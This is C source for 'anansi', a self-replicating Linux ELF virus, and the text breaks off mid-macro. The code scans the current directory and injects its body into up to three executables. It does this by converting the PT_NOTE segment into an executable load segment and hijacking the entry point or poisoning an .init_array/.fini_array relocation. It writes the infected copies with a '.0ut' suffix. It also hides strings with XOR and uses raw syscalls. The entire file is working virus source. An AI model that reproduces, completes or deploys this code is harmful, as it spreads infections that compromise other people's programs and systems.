#define _GNU_SOURCE           /* See feature_test_macros(7) */
#include<dirent.h>
#include<sys/syscall.h>
#include<unistd.h>
#include<sys/stat.h>
#include<sys/mman.h>
#include<linux/limits.h>
#include<fcntl.h>
#include<stdint.h>
#include<stdbool.h>
#include<stdarg.h>
#include<elf.h>

/* process_elf flags */
#define PROCESS_ELF_EHDR 0x00000001
#define PROCESS_ELF_PHDR 0x00000010
#define PROCESS_ELF_SHDR 0x00000100
#define PROCESS_ELF_O_RDONLY 0x00000001
#define PROCESS_ELF_O_RDWR 0x00000010
#define PROCESS_ELF_O_ATTRONLY 0x00000100
#define MAGIC_INITIALIZER_RAN 0xDEADBEEF

#define STDOUT STDOUT_FILENO
#define PAGE_SIZE 0x1000
#define FAILURE -1
#define SUCCESS 0

#ifdef DEBUG
	#define ANANSI_UNSIGNED_INT 0xa
	#define ANANSI_INT 0xb
	#define ANANSI_UNSIGNED_LONG 0xc
	#define ANANSI_LONG 0xd

	#define NUM_CONV_BUF_SIZE 70
#endif

#ifndef MAX_TARGET
	#define MAX_TARGET 3
#endif

//misc macros
#define RDRAND_BIT (1 << 30)
#define EPILOG_SIZE 30

typedef struct elfbin {
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	Elf64_Shdr *shdr;

	int fd;
	int perm;
	int orig_size;
	int new_size;
	char *f_path;

	void *read_only_mem;
	void *write_only_mem;
	int initializer_ran;

	uint64_t vx_size;
	uint8_t  *vx_start;

	uint64_t vx_vaddr;
	uint64_t vx_offset;

	int pt_note_entry;
	int text_seg_ndx;

	uint64_t desired_rela_offset;

}Elfbin;

extern unsigned long real_start;

// functions unique to anansi
int dispatch_infection(Elfbin *target);
void append_ret_2_OEP_stub(uint8_t *insertion, Elfbin *target, uint64_t orig_entry);
void pt_note_infect(Elfbin *target);
bool has_R_X86_64_RELATIVE(Elfbin *target, Elf64_Rela *r);
bool within_section(Elfbin *target, char *section, uint64_t addr);
bool check_cpu_for_rdrand();
unsigned int get_random_int();
void decrypt_xor(char *encrypted_str, char *decrypted_str);
unsigned int dynamic_entry_count(Elf64_Dyn *dyn_start, Elf64_Xword dyn_size);
void write_vx_meta_data(Elfbin *target, uint8_t *vx_start, uint64_t vx_size);
char *create_full_path(char *directory, char *filename);
void process_elf_initialize(Elfbin *c, char *full_path);
int process_elf(Elfbin *c, int attr, int perm, int len);
void process_elf_free(Elfbin *c);
bool valid_target(Elfbin *c, int min_size, bool no_shared_objects);

#ifdef DEBUG
	int anansi_printf(char *format, ...);
	char *itoa(void *data_num, int base, int var_type);
//	char *itoa_final(unsigned long n, int base);
	char *itoa_final(long n, int base, char *output, size_t len);
#endif

/* vx-mechanics functions and global vars*/
void end_code();
unsigned long get_eip();
extern unsigned long real_start;
extern unsigned long end_vx;
extern unsigned long foobar;

// anansi syscall prototypes
int anansi_exit(int status);
long anansi_write(int fd, const void *buf, size_t count);
long anansi_read(int fd, void *buf, size_t count);
void *anansi_mmap(void *addr, size_t len, int prot, int flags, int fildes, off_t off);
long anansi_stat(char *path, struct stat *statbuf);
long anansi_munmap(void *addr, size_t len);
long anansi_open(const char *pathname, int flags, int mode);
long anansi_getdents64(int fd, void *dirp, size_t count);
long anansi_getcwd(char *buf, size_t size);
long anansi_close(int fd);

//anansi libc-like function implementation prototypes


void *anansi_memset(void *s, int c, size_t n);
size_t anansi_strnlen(const char *s, size_t maxlen);
size_t anansi_strlen(const char *s);
void *anansi_malloc(size_t len);
void anansi_strncpy(char *restrict dest, const char *src, size_t n);
void *anansi_memcpy(void *dest, void *src, size_t n);
int anansi_strncmp(const char *s1, const char *s2, size_t n);

struct linux_dirent {
	unsigned long  d_ino;     /* Inode number */
	unsigned long  d_off;     /* Offset to next linux_dirent */
	unsigned short d_reclen;  /* Length of this linux_dirent */
	char           d_name[NAME_MAX +1];  /* Filename (null-terminated) */
};

int _start() {
	__asm__ volatile (
			".globl real_start\n"
			"real_start:\n"
			"push %rsp\n" //preserve rsp first since push will alter the value.
			"push %rbp\n"
			"push %rax\n"
			"push %rbx\n"
			"push %rcx\n"
			"push %rdx\n"
			"push %rsi\n"
			"push %rdi\n"
			"push %r8\n"
			"push %r9\n"
			"push %r10\n"
			"push %r11\n"
			"push %r12\n"
			"push %r13\n"
			"push %r14\n"
			"push %r15\n"
			"call vx_main\n"
			"pop %r15\n"
			"pop %r14\n"
			"pop %r13\n"
			"pop %r12\n"
			"pop %r11\n"
			"pop %r10\n"
			"pop %r9\n"
			"pop %r8\n"
			"pop %rdi\n"
			"pop %rsi\n"
			"pop %rdx\n"
			"pop %rcx\n"
			"pop %rbx\n"
			"pop %rax\n"
			"pop %rbp\n"
			"pop %rsp\n"
			"jmp end_code\n"
			);
}

void vx_main()
{
	char *cwd = NULL;
	char *cwd_listings = NULL;
	char *full_path = NULL;

	struct linux_dirent *d;
	int cwd_fd, nread, attr, status = SUCCESS, max_target = MAX_TARGET;
	const size_t DIR_LISTING_SIZE = 5000;

	Elfbin target;

	uint64_t vx_size = (uint8_t *)&end_vx - (uint8_t *)&real_start;

	uint8_t *vx_start = (uint8_t *)get_eip() - ((uint8_t *)&foobar - (uint8_t *)&real_start); //calculates the address of vx_main
	char test_msg[] = "Infection Time\n";
	anansi_write(1, test_msg, 15);

#ifdef DEBUG
	anansi_printf("vx_start @ 0x0%lx\n", vx_start);
	anansi_printf("vx_size @ 0x%lx\n", vx_size);
#endif

	if(!(cwd = anansi_malloc(PATH_MAX))) {
		status = FAILURE;
		goto clean_up;
	}

	if(!(cwd_listings = anansi_malloc(DIR_LISTING_SIZE))) {
		status = FAILURE;
		goto clean_up;
	}

	anansi_getcwd(cwd, PATH_MAX);
	if((cwd_fd = anansi_open(cwd, O_RDONLY | O_DIRECTORY, 0)) < 0) {
		status = FAILURE;
		goto clean_up;
	}

	nread = anansi_getdents64(cwd_fd, cwd_listings, DIR_LISTING_SIZE);
	attr = PROCESS_ELF_EHDR | PROCESS_ELF_PHDR | PROCESS_ELF_SHDR;

	target.vx_size = vx_size;
	target.vx_start = vx_start;

	for(long entry = 0; entry < nread; entry += d->d_reclen) {
		d = (struct linux_dirent *) (cwd_listings + entry);
		if(d->d_name[0] == '.' )
			continue;

		if(!max_target)
			break;

		if(!(full_path = create_full_path(cwd, d->d_name)))
			continue;

		process_elf_initialize(&target, full_path);
		write_vx_meta_data(&target, vx_start, vx_size);
		if(process_elf(&target, attr, PROCESS_ELF_O_RDWR, vx_size) == SUCCESS)
			if (valid_target(&target, sizeof(Elf64_Ehdr), false)) {
				dispatch_infection(&target);
				max_target--;
			}

		anansi_munmap(full_path, anansi_strlen(full_path) + 1);
		process_elf_free(&target);
	}

clean_up:
	if(cwd != NULL)
		anansi_munmap(cwd, PATH_MAX);
	if(cwd_listings != NULL)
		anansi_munmap(cwd_listings, DIR_LISTING_SIZE);
}

int dispatch_infection(Elfbin *target)
{
	Elf64_Rela desired_relocation;
	Elf64_Rela *mod_reloc;
	Elf64_Ehdr *hdr;
	uint8_t *insertion;
	uint64_t orig_entry;

	char filename_append[] = ".0ut";

	bool use_reloc_poison;
#ifdef DEBUG
	anansi_printf("Viable target: %s\n", target->f_path);
#endif

	use_reloc_poison = has_R_X86_64_RELATIVE(target, &desired_relocation);
#ifdef DEBUG
	if(use_reloc_poison) {
		anansi_printf("R_X86_64_RELATIVE offset @ %lx and addend @ %lx\n", desired_relocation.r_offset, desired_relocation.r_addend);
	}
#endif

	pt_note_infect(target);
	insertion = (uint8_t *)(target->write_only_mem + target->vx_offset);
	anansi_memcpy(insertion, target->vx_start,target->vx_size);

	if(use_reloc_poison) {
		mod_reloc = (Elf64_Rela *)(target->write_only_mem + target->desired_rela_offset);
		orig_entry = mod_reloc->r_addend;
		mod_reloc->r_addend = target->vx_vaddr;
	}else {
		hdr = (Elf64_Ehdr *)(target->write_only_mem);
		orig_entry = hdr->e_entry; //backup original entry point
		hdr->e_entry = target->vx_vaddr;
	}

	append_ret_2_OEP_stub(insertion, target, orig_entry);

	size_t f_path_len = anansi_strlen(target->f_path);
	char *v_name = anansi_malloc(f_path_len + 5);
	int fd_out;
	anansi_strncpy(v_name, target->f_path, f_path_len);
	anansi_strncpy(v_name + f_path_len, filename_append, 4);
#ifdef DEBUG
	anansi_printf("\t\t\tCreateding viral file %s\n", v_name);
#endif
	fd_out = anansi_open(v_name, O_CREAT | O_WRONLY, S_IRWXU | S_IRGRP | S_IROTH);
	if(fd_out < 0) {
#ifdef DEBUG
		anansi_printf("failure to open v_name\n");
#endif
		return -1;
	}
#ifdef DEBUG
	anansi_printf("new_size @@ %d\n", target->new_size);
#endif
	anansi_write(fd_out, target->write_only_mem, target->new_size);
	anansi_close(fd_out);
	anansi_munmap(v_name, f_path_len + 5);
	return 0;
}

void append_ret_2_OEP_stub(uint8_t *insertion, Elfbin *target, uint64_t orig_entry)
{
	unsigned char epilog[EPILOG_SIZE];
	unsigned int relative_call_len = 18;

	unsigned char inst_two[] = "\x48\x2d";
	unsigned char inst_three[] = "\x48\x05";
	unsigned char inst_four[] = "\xff\xe0";
	unsigned char inst_five[] = "\x48\x8b\x04\x24";
	uint64_t stub_vx_size = target->vx_size + 5;
	int vx_size_cpy = target->vx_size;
	int vx_size_actual_len = 0;

	do {
		vx_size_cpy >>= 8;
		vx_size_actual_len++;
	} while(vx_size_cpy);


	anansi_memset(epilog, 0x00, 30);
	epilog[0] = 0xe8;
	epilog[1] = relative_call_len + vx_size_actual_len;
	anansi_memcpy(epilog + 5, inst_two, 2); //sub <vx_size>, %rax
	anansi_memcpy(epilog + 7, &stub_vx_size, 4);

	anansi_memcpy(epilog + 11, inst_two, 2); //sub <vx_start>, %rax
	anansi_memcpy(epilog + 13, &target->vx_vaddr, 4);

	anansi_memcpy(epilog + 17, inst_three, 2); //add <e_entry>, %rax
	anansi_memcpy(epilog + 19, &orig_entry, 4);

	anansi_memcpy(epilog + 23, inst_four, 2); //jmp rax

	anansi_memcpy(epilog + 25, inst_five, 4); // mov rax, [rsp] #get_eip relative call enters here
	anansi_memcpy(epilog + 29, "\xc3", 1 ); // ret

	anansi_memcpy(insertion + target->vx_size, epilog, 30);
}

void pt_note_infect(Elfbin *target)
{
	Elf64_Phdr *phdrs = (Elf64_Phdr *)(target->write_only_mem + target->ehdr->e_phoff);
	phdrs[target->pt_note_entry].p_type = PT_LOAD;
	phdrs[target->pt_note_entry].p_flags = PF_X | PF_R;
	phdrs[target->pt_note_entry].p_vaddr = 0xc000000 + target->orig_size;
	phdrs[target->pt_note_entry].p_filesz += target->vx_size;
	phdrs[target->pt_note_entry].p_memsz += target->vx_size;
	phdrs[target->pt_note_entry].p_offset = target->orig_size;

	target->vx_vaddr = phdrs[target->pt_note_entry].p_vaddr;
	target->vx_offset = phdrs[target->pt_note_entry].p_offset;
}

/*
 * Checks to see if relocation poisoning/hijacking is viable, we are targeting R_X86_64_RELATIVE relocation type.
 * libc and ld-linux shared objects should not contain this type.
 */

bool has_R_X86_64_RELATIVE(Elfbin *target, Elf64_Rela *desired_reloc)
{
	int p_entry;

	Elf64_Xword dyn_size;
	int dyn_entry_cnt;

	int dynamic_phdr;
	bool found_dynamic = false;

	Elf64_Rela *reloc_entry;
	Elf64_Dyn *dyn_start;
	Elf64_Dyn *dyn_entries;

	Elf64_Addr rela_offset = 0;
	Elf64_Xword rela_sz, rela_ent_size;

	char init_array[] = ".init_array";
	char fini_array[] = ".fini_array";

	Elf64_Word rela_count = 0;
	for(p_entry = 0; p_entry < target->ehdr->e_phnum; p_entry++) {
		if(target->phdr[p_entry].p_type == PT_DYNAMIC) {
			found_dynamic = true;
			break;
		}
	}

	if(!found_dynamic)
		return false;
	dynamic_phdr = p_entry;

	dyn_start = (Elf64_Dyn *)(target->read_only_mem + target->phdr[dynamic_phdr].p_offset);
	dyn_size = target->phdr[dynamic_phdr].p_filesz;
	dyn_entry_cnt = dynamic_entry_count(dyn_start, dyn_size);

	dyn_entries = dyn_start;
	for(int i = 0; i <= dyn_entry_cnt; i++) {
		if(dyn_entries[i].d_tag == DT_RELA)
			rela_offset = dyn_entries[i].d_un.d_val;

		if(dyn_entries[i].d_tag == DT_RELASZ)
			rela_sz = dyn_entries[i].d_un.d_val;

		if(dyn_entries[i].d_tag == DT_RELAENT)
			rela_ent_size = dyn_entries[i].d_un.d_val;
	}

	rela_count = rela_sz / rela_ent_size;
	reloc_entry = (Elf64_Rela*)(target->read_only_mem + rela_offset);
	char *random_section = get_random_int() % 2 ? init_array : fini_array;

	for(int r = 0; r <= rela_count; r++) {
		if(reloc_entry[r].r_info == R_X86_64_RELATIVE) {
			if(within_section(target, random_section, reloc_entry[r].r_offset)) {
				desired_reloc->r_offset = reloc_entry[r].r_offset;
				desired_reloc->r_info = reloc_entry[r].r_info;
				desired_reloc->r_addend = reloc_entry[r].r_addend;

				//take note where to find this offset for modification later.
				target->desired_rela_offset = r * rela_sz;
				return true;
			}
		}
	}
	return false;
}

bool within_section(Elfbin *target, char *section, uint64_t addr)
{
	uint64_t end_addr, start_addr;
	int s_index = target->ehdr->e_shstrndx;
	Elf64_Shdr *strtab_section = &target->shdr[s_index];
	uint8_t *strtab = (uint8_t *)(target->read_only_mem + strtab_section->sh_offset);

	for(int i = 0; i < target->ehdr->e_shnum; i++) {
		if(!anansi_strncmp(&strtab[target->shdr[i].sh_name], section, anansi_strlen(section))) {
			start_addr = target->shdr[i].sh_addr;
			end_addr = target->shdr[i].sh_addr + target->shdr[i].sh_size;
			return (addr >= start_addr) && (addr <= end_addr);
		}
	}
	return false;
}

bool check_cpu_for_rdrand()
{
	int ecx;

	__asm__ __volatile__(
			"movl $1, %%eax\n"
			"cpuid\n"
			"movl %%ecx, %0"
			: "=g" (ecx)
			: \
			: "%eax", "%ebx", "%ecx", "%edx"
			);

	return (ecx & RDRAND_BIT) == RDRAND_BIT;
}

unsigned int get_random_int()
{
	char *dev_slash_random = NULL;
	char encrypted_dev_slash_random[] = ".edw.s`oenl";
	bool cpu_supports_rdrand = false;
	unsigned int r_integer = 0;
	uint8_t err;

	int max_reads = 5;
	int fd = -1;
	size_t s_len;


	if((cpu_supports_rdrand = check_cpu_for_rdrand())) {
		while(max_reads--) {
			__asm__ __volatile__ (
					"rdrand %%eax\n"
					"setc %1\n"
					"movl %%eax, %0\n"
					: "=g" (r_integer), "=g" (err)
					: \
					: "%eax"
					);
			if(err == 1)
				break;
		}
	}

	/* We've either exhausted max_reads or the cpu doesn't support rdrand, */
	/* in either case we will use another src of entropy */
	if(max_reads == 0 || !cpu_supports_rdrand) {
		s_len = anansi_strlen(encrypted_dev_slash_random);
		dev_slash_random = anansi_malloc(s_len); //TODO: failpoint
		if(dev_slash_random == NULL)
			goto clean_up;

		decrypt_xor(encrypted_dev_slash_random, dev_slash_random);
		fd = anansi_open(dev_slash_random, O_RDONLY, 0);
		if(fd < 0)
			goto clean_up;

		if(anansi_read(fd, &r_integer, sizeof(unsigned int)) < 0)
			goto clean_up;
	}

	clean_up:
	if(dev_slash_random != NULL)
		anansi_munmap(encrypted_dev_slash_random, s_len);
	if(fd > 0)
		anansi_close(fd);

	return r_integer;
}

void decrypt_xor(char *encrypted_str, char *decrypted_str)
{
	char *d_ptr = decrypted_str;;
	int key = 0x890c6d01;

	while(*encrypted_str != '\0')
		*d_ptr++ = *encrypted_str++ ^ key;
	*d_ptr = '\0';
}

unsigned int dynamic_entry_count(Elf64_Dyn *dyn_start, Elf64_Xword dyn_size)
{
	Elf64_Dyn *cur_dyn_entry;
	void *dyn_end = dyn_start + dyn_size;
	int cnt = 1; //DT_NULL

	for(cur_dyn_entry = dyn_start; (uint8_t *)cur_dyn_entry <= (uint8_t *)dyn_end; cur_dyn_entry++, cnt++)
		if(cur_dyn_entry->d_tag == DT_NULL)
			break;

	return cnt;
}


void write_vx_meta_data(Elfbin *target, uint8_t *vx_start, uint64_t vx_size)
{
	target->vx_start = vx_start;
	target->vx_size = vx_size;
}

int process_elf(Elfbin *target, int attr, int perm, int len)
{
	int fd;
	void *mem = NULL;
	struct stat fs;
	char *p = target->f_path;
	char ELFMAGIC[] = {0x7f, 'E', 'L', 'F'};
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	Elf64_Shdr *shdr;

	if((fd = anansi_open(p, O_RDONLY, 0)) < 0)
		return -1;

	if(anansi_stat(p, &fs) < 0)
		return -1;

	if(S_ISDIR(fs.st_mode))
		return -1;

	if(fs.st_size < (sizeof(Elf64_Ehdr) + sizeof(Elf64_Phdr) + sizeof(Elf64_Shdr)))
		return -1;

	if((mem = anansi_mmap(0, fs.st_size, PROT_READ, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
		return -1;

	if(anansi_strncmp(mem, ELFMAGIC, 4) < 0)
		return -1;

	ehdr = (Elf64_Ehdr *)mem;
	phdr = (Elf64_Phdr *)(mem + (((Elf64_Ehdr *)mem)->e_phoff));
	shdr = (Elf64_Shdr *)(mem + ehdr->e_shoff);

	if(perm & PROCESS_ELF_O_RDONLY || perm & PROCESS_ELF_O_RDWR) {
		target->read_only_mem = mem;
	}


	if(perm != PROCESS_ELF_O_ATTRONLY) {
		target->orig_size = fs.st_size;
		target->fd = fd;
		target->perm = perm; //need this for freeing fields with independent heap allocations via anansi_malloc()
	}

	if(perm & PROCESS_ELF_O_RDWR) {
		target->write_only_mem = anansi_malloc(fs.st_size + len + EPILOG_SIZE);
		if(target->write_only_mem == NULL)
			return -1;
		anansi_memcpy(target->write_only_mem, target->read_only_mem, fs.st_size);
		target->new_size = fs.st_size + len + EPILOG_SIZE;
	}

	if(attr & PROCESS_ELF_EHDR) {
		if(perm == PROCESS_ELF_O_ATTRONLY) {
			target->ehdr = anansi_malloc(sizeof(Elf64_Ehdr));
			if(target->ehdr == NULL)
				return -1;
			anansi_memcpy(target->ehdr, ehdr, sizeof(Elf64_Ehdr));
		}else {
			target->ehdr = ehdr;
		}
	}

	if(attr & PROCESS_ELF_PHDR) {
		if(perm == PROCESS_ELF_O_ATTRONLY) {
			target->phdr = anansi_malloc(sizeof(Elf64_Phdr));
			if(target->phdr == NULL)
				return -1;
			anansi_memcpy(target->phdr, phdr, sizeof(Elf64_Phdr));
		}else {
			target->phdr = phdr;
			for(int p_entry = 0; p_entry < target->ehdr->e_phnum; p_entry++)
				if(target->phdr[p_entry].p_type == PT_NOTE)
					target->pt_note_entry = p_entry;

			for(int p_entry = 0; (p_entry < target->ehdr->e_phnum) && (!target->text_seg_ndx); p_entry++)
				if(target->phdr[p_entry].p_type == PT_LOAD)
					if(target->phdr[p_entry].p_flags == (PF_X | PF_R))
						target->text_seg_ndx = p_entry;
		}
	}

	if(attr & PROCESS_ELF_SHDR) {
		if(perm == PROCESS_ELF_O_ATTRONLY) {
			target->shdr = anansi_malloc(sizeof(Elf64_Shdr));
			if(target->shdr == NULL)
				return -1;
			anansi_memcpy(target->shdr, shdr, sizeof(Elf64_Shdr));
		}else {
			target->shdr = shdr;
		}
	}

	return 0;

}

/*
 - Necessary for process_elf_free() to work correctly.
*/

void process_elf_initialize(Elfbin *c, char *full_path)
{
	anansi_memset(c, 0, sizeof(Elfbin));
	c->initializer_ran = MAGIC_INITIALIZER_RAN;
	c->f_path = full_path;
}

/*
 - Free pointers in the struct (Elfbin) based on passwd in attributes.
 - Close fd field.
 - Zero out other fields (discourage reuse of the reference).
*/

void process_elf_free(Elfbin *c)
{
	if(c->initializer_ran == MAGIC_INITIALIZER_RAN) {
		if(c->perm == PROCESS_ELF_O_ATTRONLY) {
			if(c->ehdr != NULL)
				anansi_munmap(c->ehdr, sizeof(Elf64_Ehdr));
			if(c->phdr != NULL)
				anansi_munmap(c->phdr, sizeof(Elf64_Phdr));
			if(c->shdr != NULL)
				anansi_munmap(c->shdr, sizeof(Elf64_Shdr));
		}


		if(c->perm == PROCESS_ELF_O_RDONLY || c->perm == PROCESS_ELF_O_RDWR)
			if(c->read_only_mem != NULL)
				anansi_munmap(c->read_only_mem, c->orig_size);


		if(c->perm == PROCESS_ELF_O_RDWR)
			if(c->write_only_mem != NULL)
				anansi_munmap(c->write_only_mem, c->new_size);;


		anansi_close(c->fd);
		c->orig_size = 0;
		c->new_size = 0;
		c->perm = 0;
	}
}

bool valid_target(Elfbin *c, int min_size, bool no_shared_objects)
{
	bool pt_interp_present = false;

	//If less than a ELF header (64-bit), lets not waste syscalls.
	if(c->orig_size < min_size)
		return false;

	if(*(uint8_t *)(c->read_only_mem + EI_CLASS) != ELFCLASS64)
		return false;

	if(c->ehdr->e_type != ET_EXEC)
		if(c->ehdr->e_type != ET_DYN)
			return false;

	if(no_shared_objects) {
		//ET_DYN is an elf type shared by both shared objects and PIE binaries.
		//The absence of a program header of type PT_INTERP in conjunction with ET_DYN is indicative of a shared object.
		//libc and ld-linux are exceptions, since they are both libraries and executables
		if(c->ehdr->e_type == ET_DYN) {
			for(int p_entry = 0; p_entry < c->ehdr->e_phnum; p_entry++) {
				if(c->phdr[p_entry].p_type == PT_INTERP)
					pt_interp_present = true;
			}

			if(!pt_interp_present)
				return false;
		}
	}

	return true;
}

char *create_full_path(char *directory, char *filename)
{
	char *absolute_path;
	size_t filename_len = anansi_strlen(filename);
	size_t dir_len = anansi_strlen(directory);
	size_t allocatation_size  = anansi_strlen(directory) + filename_len;

	// 1 byte for null terminator and 1 byte for '/' appended to directory
	allocatation_size += 2;
	if(!(absolute_path = anansi_malloc(allocatation_size))) {
		return NULL;
	}

	anansi_strncpy(absolute_path, directory, allocatation_size);

	absolute_path[dir_len++] = '/';
	anansi_strncpy(absolute_path + dir_len, filename, filename_len);
	absolute_path[allocatation_size] = '\0';

	return absolute_path;
}

#ifdef DEBUG
int anansi_printf(char *format, ...)
{
	char *string, *ptr, *str_integer;
	int count, base = 0;


	int var_num_int;
	unsigned int var_num_u_int;

	long var_num_long;
	unsigned long var_num_u_long;

	void *var_ptr;
	int var_type;

	va_list arg;
	va_start(arg, format);

	for(ptr = format; *ptr != '\0'; ptr++) {
		while(*ptr != '%' && *ptr != '\0') {
			count += anansi_write(1, ptr, 1);
			ptr++;
		}

		if(*ptr == '\0')
			break;
keep_parsing:
		ptr++;
		switch(*ptr) {
		case 'b':
			base = 2;
			goto keep_parsing;
		case 'l':
			if (*(ptr + 1) == ' ') {
				var_ptr =  &var_num_long;
				var_type = ANANSI_LONG;
				*(long *)var_ptr = va_arg(arg, long);
				str_integer =  itoa(var_ptr, base, var_type);
				count += anansi_write(STDOUT, str_integer, anansi_strlen(str_integer));
				anansi_munmap(str_integer, anansi_strlen((str_integer)));
				break;
			}

			if(*(ptr + 1) == 'u' || *(ptr + 1) == 'x') {
				var_ptr = &var_num_u_long;
				goto keep_parsing;
			}

			anansi_write(STDOUT, "%l", 2);
			anansi_write(STDOUT, ptr + 1, 1);
			break;

		case 'u':

			if(var_ptr == &var_num_u_long) {
				*(unsigned long *)var_ptr = va_arg(arg, unsigned long);
				var_type = ANANSI_UNSIGNED_LONG;
			}else{
				var_ptr = &var_num_int;
				*(int *)var_ptr = va_arg(arg, int);
				var_type = ANANSI_INT;
			}

			str_integer = itoa(var_ptr, (base == 0 ? 10 : base), var_type);
			count += anansi_write(STDOUT, str_integer, anansi_strlen(str_integer));
			anansi_munmap(str_integer, anansi_strlen((str_integer)));
			var_ptr = NULL;
			base = 0;
			break;

		case 'x':
			if(var_ptr == &var_num_u_long) {
				*(unsigned long *)var_ptr = va_arg(arg, unsigned long);
				var_type = ANANSI_UNSIGNED_LONG;
			}else {
				var_ptr = &var_num_u_int;
				*(unsigned int *)var_ptr = va_arg(arg, unsigned int);
				var_type = ANANSI_UNSIGNED_INT;
			}


			str_integer = itoa(var_ptr, 16, var_type);
			count += anansi_write(STDOUT, str_integer, anansi_strlen(str_integer));
			anansi_munmap(str_integer, anansi_strlen((str_integer)));
			var_ptr = NULL;
			break;

		case 'd':
			var_ptr = &var_num_int;
			*(int *)var_ptr = va_arg(arg, int);
			var_type =  ANANSI_INT;
			str_integer = itoa(var_ptr,(base == 0 ? 10 : base), var_type);
			count += anansi_write(STDOUT, str_integer, anansi_strlen(str_integer));
			anansi_munmap(str_integer, anansi_strlen((str_integer)));
			var_ptr = NULL;
			base = 0;
			break;

		case 's':
			string = va_arg(arg, char *);
			count += anansi_write(STDOUT, string, anansi_strlen(string));
			break;
		}
	}

	return count;
}

char *itoa(void *data_num, int base, int var_type) {
	char *output = (char *)anansi_malloc(NUM_CONV_BUF_SIZE);

	anansi_memset(output, 0, NUM_CONV_BUF_SIZE);

	if(var_type == ANANSI_UNSIGNED_INT)
		return itoa_final(*(unsigned int *)data_num, base, output, NUM_CONV_BUF_SIZE);
	if(var_type == ANANSI_INT)
		return itoa_final(*(int *)data_num, base, output, NUM_CONV_BUF_SIZE);
	if(var_type == ANANSI_UNSIGNED_LONG)
		return itoa_final(*(unsigned long *)data_num, base, output, NUM_CONV_BUF_SIZE);
	else
		return itoa_final(*(long *)data_num, base, output, NUM_CONV_BUF_SIZE);
}
/*
char *itoa_final(unsigned long n, int base)
{
	char *conv = "0123456789abcdef";

	static char buf[25];
	static int index = 23;
	static bool negative = false;

	char *buf_final;

	buf[24] = '\0';
	if(n < 0) {
        	negative = true;
		n = -n;
	}

	if(n < base) {
        	buf[--index] = conv[n];

		if(negative)
			buf[--index] = '-';

		if(base == 8)
			buf[--index] = '0';

		if(base == 16) {
			index -= 2;
			buf[index] = '0';
			buf[index + 1] = 'x';
		}

		buf_final = &buf[index];
		index = 23;
		negative = false;
		return buf_final;
	}else {
        	buf[--index] = conv[n % base];
		return itoa_final(n / base, base);
	}
}
 */

char *itoa_final(long n, int base, char *output, size_t len) {
	char buf[NUM_CONV_BUF_SIZE];
	char conv[] = "0123456789abcdef";
	char hex_symbol[] = "0x";
	bool neg = false;
	int index = 0;
	char *ptr;

	if (n < 0) {
		neg = true;
		n = -(n);
	}

	while(n >= base) {
		buf[index++] = conv[n % base];
		n = n / base;
	}

	buf[index++] = conv[n % base];
	buf[index] = '\0';

	ptr = output;
	if(neg)
		*(ptr++) = '-';

	if(base == 16) {
		anansi_strncpy(ptr, hex_symbol, 2);
		ptr += 2;
	}

	if(base == 8)
		*(ptr++) = 'o';

	for(int i = index - 1; i >= 0 && ptr < (output + NUM_CONV_BUF_SIZE - 1); i--, ptr++) {
		*ptr = buf[i];
	}

	*ptr = '\0';
	return output;
}

#endif

void *anansi_memset(void *s, int c, size_t n)
{
	uint8_t *ptr = (uint8_t *)s;
	while(n--)
		*ptr++ = c & 0xff;

	return s;
}

size_t anansi_strlen(const char *s)
{
	size_t len = 0;
	while(*s++ != '\0')
		len++;

	return len;
}

size_t anansi_strnlen(const char *s, size_t maxlen)
{
	size_t len;
	for(len = 0; len < maxlen && *s != '\0'; len++)
		s++;

	return len;
}

void *anansi_malloc(size_t len)
{
	void *mem;
	mem = anansi_mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
	return mem;
}

void anansi_strncpy(char *restrict dest, const char *src, size_t n)
{
	while(n-- && *src != '\0')
		*dest++ = *src++;
	*dest  = '\0';
}

void *anansi_memcpy(void *dest, void *src, size_t n)
{
	for(int i = 0; i < n; i++) {
		*(uint8_t *)dest++ = *(uint8_t *)src++;
	}
	return dest - n;
}

int anansi_strncmp(const char *s1, const char *s2, size_t n)
{
	while(n--)
		if(*s1++ != *s2++) return -1;

	return 0;
}

#define __load_syscall_ret(var) __asm__ __volatile__ ("mov %%rax, %0" : "=r" (var));
#define __write_syscall(type, name, arg1, arg1_type, arg2, arg2_type, arg3, arg3_type) \
	type name(arg1_type arg1, arg2_type arg2, arg3_type arg3) { \
		type ret; \
		__asm__ __volatile__ (\
				"movq $1, %%rax\n" \
				"movq %0, %%rdi\n" \
				"movq %1, %%rsi\n" \
				"movq %2, %%rdx\n" \
				"syscall" \
           			      : \
				      : "g" (arg1), "g" (arg2), "g" (arg3) \
				      : "%rax", "%rdi", "%rsi", "%rdx" \
		); \
		__load_syscall_ret(ret); \
		return ret; \
	}

#define __exit_syscall(type, name, arg1, arg1_type) \
	type name(arg1_type arg1) { \
		type  ret; \
		__asm__ __volatile__ ( \
				"movq $60, %%rax\n" \
				"syscall\n" \
			       	: "=r" (ret) \
				: "D" (arg1) \
				: "%rax" \
		); \
		return ret; \
	}

#define __read_syscall(type, name, arg1, arg1_type, arg2, arg2_type, arg3, arg3_type) \
	type name(arg1_type arg1, arg2_type arg2, arg3_type arg3) { \
		type ret; \
		__asm__ __volatile__ (\
				"movq $0, %%rax\n" \
				"movq %0, %%rdi\n" \
				"movq %1, %%rsi\n" \
				"movq %2, %%rdx\n" \
				"syscall" \
					: \
					: "g" (arg1), "g" (arg2), "g" (arg3) \
					: "%rax", "%rdi", "%rsi", "%rdx" \
		); \
		__load_syscall_ret(ret); \
		return ret; \
	}

#define __mmap_syscall(type, name, arg1, arg1_type, arg2,  arg2_type, arg3, arg3_type, arg4, arg4_type, arg5, arg5_type, arg6, arg6_type) \
        type name(arg1_type arg1, arg2_type arg2, arg3_type arg3, arg4_type arg4, arg5_type arg5, arg6_type arg6) { \
                type ret; \
                __asm__ __volatile__(\
                                "movq $9, %%rax\n" \
                                "movq %0, %%rdi\n" \
                                "movq %1, %%rsi\n" \
                                "movq %2, %%rdx\n" \
                                "movq %3, %%r10\n" \
                                "movq %4, %%r8\n" \
                                "movq %5, %%r9\n" \
                                "syscall" \
                                        : \
                                        : "g" (arg1), "g" (arg2), "g" (arg3), "g" (arg4), "g" (arg5), "g" (arg6) \
                                        : "%rax", "%rdi", "%rsi", "%rdx", "%r10", "%r8", "%r9" \
                ); \
                __load_syscall_ret(ret); \
                return ret; \
        }
#define __stat_syscall(type, name, arg1, arg1_type, arg2, arg2_type) \
